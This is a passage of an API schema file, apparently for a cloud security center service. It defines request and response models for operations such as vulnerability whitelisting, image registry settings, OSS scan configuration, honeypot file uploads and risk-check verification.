*   **agentless**', example='image', position='Query'),
  target?: string(name='Target', description='The vulnerability that you want to add to the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the vulnerability. The value is fixed to repo.
*   **target**: The content of the vulnerability. The value is in the format of Namespace/Image repository.', example='{\\"type\\":\\"repo\\",\\"target\\":[\\"sas_test/script_0209\\",\\"sas_test/script\\"]}', position='Query'),
}

model UpdateImageVulWhitelistTargetResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether the image vulnerability is added to the whitelist. Valid values:

*   **true**
*   **false**', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model UpdateImageVulWhitelistTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateImageVulWhitelistTargetResponseBody(name='body'),
}

async function updateImageVulWhitelistTarget(request: UpdateImageVulWhitelistTargetRequest): UpdateImageVulWhitelistTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateImageVulWhitelistTarget', 'POST', '/', 'json', false, 'json', request);
}

model UpdateJenkinsImageRegistryNameRequest {
  registryId?: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.', example='25090', position='Body'),
  registryName?: string(name='RegistryName', description='The name of the image repository.', example='a0603tk1', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XXX.XXX', position='Query'),
}

model UpdateJenkinsImageRegistryNameResponseBody = {
  data?: boolean(name='Data', description='The result of the operation. Valid values:

*   **true**: successful
*   **false**: failed', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model UpdateJenkinsImageRegistryNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryNameResponseBody(name='body'),
}

async function updateJenkinsImageRegistryName(request: UpdateJenkinsImageRegistryNameRequest): UpdateJenkinsImageRegistryNameResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateJenkinsImageRegistryName', 'POST', '/', 'json', true, 'form', request);
}

model UpdateJenkinsImageRegistryPersistenceDayRequest {
  persistenceDay?: int32(name='PersistenceDay', description='The retention period. Unit: days.', example='30', position='Body'),
  registryId?: long(name='RegistryId', description='The ID of the image repository.

> You can call the [PageImageRegistry](~~PageImageRegistry~~) operation to query the IDs of image repositories.', example='25363', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XXX.XXX', position='Query'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='69F88BA1-004C-51E2-BF5C-A3220E5A****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model UpdateJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function updateJenkinsImageRegistryPersistenceDay(request: UpdateJenkinsImageRegistryPersistenceDayRequest): UpdateJenkinsImageRegistryPersistenceDayResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateJenkinsImageRegistryPersistenceDay', 'POST', '/', 'json', true, 'form', request);
}

model UpdateOssScanConfigRequest {
  bucketNameList?: [ string ](name='BucketNameList', position='Query'),
  enable?: int32(name='Enable', example='0', position='Query'),
  endTime?: string(name='EndTime', example='00:00:01', position='Query'),
  keySuffixList?: [ string ](name='KeySuffixList', position='Query'),
  scanDayList?: [ int32 ](name='ScanDayList', position='Query'),
  startTime?: string(name='StartTime', example='00:00:00', position='Query'),
}

model UpdateOssScanConfigResponseBody = {
  requestId?: string(name='RequestId', example='FFA14F61-4E2F-54C7-9276-81C60BAC****'),
}

model UpdateOssScanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateOssScanConfigResponseBody(name='body'),
}

async function updateOssScanConfig(request: UpdateOssScanConfigRequest): UpdateOssScanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateOssScanConfig', 'POST', '/', 'json', false, 'json', request);
}

model UpdateSelectionKeyByTypeRequest {
  businessType?: string(name='BusinessType', example='VIRUS_SCAN_CYCLE_CONFIG', position='Query'),
  selectionKey?: string(name='SelectionKey', example='614d179e-4776-4939-a04a-d842ce64****', position='Query'),
}

model UpdateSelectionKeyByTypeResponseBody = {
  requestId?: string(name='RequestId', example='DBABBC2E-26DF-5586-BF7C-4FC846EF****'),
}

model UpdateSelectionKeyByTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpdateSelectionKeyByTypeResponseBody(name='body'),
}

async function updateSelectionKeyByType(request: UpdateSelectionKeyByTypeRequest): UpdateSelectionKeyByTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpdateSelectionKeyByType', 'POST', '/', 'json', false, 'json', request);
}

model UpgradeBackupPolicyVersionRequest {
  id: long(name='Id', description='The ID of the anti-ransomware policy.

> You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
}

model UpgradeBackupPolicyVersionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F5B8057-3E44-54DC-AC89-6814A4CD****'),
}

model UpgradeBackupPolicyVersionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpgradeBackupPolicyVersionResponseBody(name='body'),
}

async function upgradeBackupPolicyVersion(request: UpgradeBackupPolicyVersionRequest): UpgradeBackupPolicyVersionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UpgradeBackupPolicyVersion', 'POST', '/', 'json', false, 'json', request);
}

model UploadedHoneyPotFileRequest {
  fileKey: string(name='FileKey', example='HONEYPOT_FILE/1601097845544644_********', position='Query'),
  fileName: string(name='FileName', example='trojan.zip', position='Query'),
  fileType: string(name='FileType', example='application/zip', position='Query'),
  honeypotImageName: string(name='HoneypotImageName', example='ruoyi', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  nodeId?: string(name='NodeId', example='cc427e14-f257-4670-9d2b-d83bbbe*****', position='Query'),
  templateExtra: string(name='TemplateExtra', example='{\\"help\\":\\".zip\\",\\"label\\":\\"file\\",\\"type\\":\\"file\\",\\"key\\":\\"ftpfiles.zip\\"}', position='Query'),
}

model UploadedHoneyPotFileResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='427F89F8-6DFE-57CC-9593-3487CA93****'),
  success?: boolean(name='Success', example='true'),
}

model UploadedHoneyPotFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UploadedHoneyPotFileResponseBody(name='body'),
}

async function uploadedHoneyPotFile(request: UploadedHoneyPotFileRequest): UploadedHoneyPotFileResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'UploadedHoneyPotFile', 'POST', '/', 'json', false, 'json', request);
}

model ValidateHcWarningsRequest {
  checkIds?: string(name='CheckIds', description='The IDs of the check items. Separate multiple IDs with commas (,).

> You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of check items.', example='695,234', position='Query'),
  riskIds?: string(name='RiskIds', description='The list of IDs of the risk items that you want to verify. Separate multiple IDs with commas (,).

> You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of risk items.', example='43', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of the servers on which you want to verify the risk items. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='78645c8e-2e89-441b-8eb,a9622a6b-adb5-4dd3-929e,0136460a-1cb5-44e8-****', position='Query'),
}

model ValidateHcWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='722C4F88-7867-4E7B-8ADE-7451053'),
}

model ValidateHcWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ValidateHcWarningsResponseBody(name='body'),
}

async function validateHcWarnings(request: ValidateHcWarningsRequest): ValidateHcWarningsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ValidateHcWarnings', 'POST', '/', 'json', false, 'json', request);
}

model VerifyCheckInstanceResultRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [ListCheckResult](~~ListCheckResult~~) operation to query the IDs of check items.', example='16', position='Query'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the assets on which risks are detected based on the check item.', position='Query'),
}

model VerifyCheckInstanceResultResponseBody = {
  data?: {
    failInstances?: [ string ](name='FailInstances', description='An array consisting of instances that failed the check.'),
    operateCode?: string(name='OperateCode', description='The operation code of the task that checks the configurations of cloud services. Valid values:

*   **Throttling**
*   **ActionTrialUnauthorized**', example='ActionTrialUnauthorized'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B869E3A0-1147-539D-9920-47580700****'),
}

model VerifyCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckInstanceResultResponseBody(name='body'),
}

async function verifyCheckInstanceResult(request: VerifyCheckInstanceResultRequest): VerifyCheckInstanceResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'VerifyCheckInstanceResult', 'POST', '/', 'json', false, 'json', request);
}

model VerifyCheckResultRequest {
  checkIds?: [ long ](name='CheckIds', description='An array that consists of the IDs of risk items.', position='Query'),
}

model VerifyCheckResultResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', description='The operation code of the cloud service configuration task. Valid values:

*   **Throttling**: frequency limit
*   **ActionTrialUnauthorized**: an error that is related to unauthorized operations', example='Throttling'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C0A3FA0-AA32-5660-8989-85A5582F****'),
}

model VerifyCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckResultResponseBody(name='body'),
}

async function verifyCheckResult(request: VerifyCheckResultRequest): VerifyCheckResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'VerifyCheckResult', 'POST', '/', 'json', false, 'json', request);
}

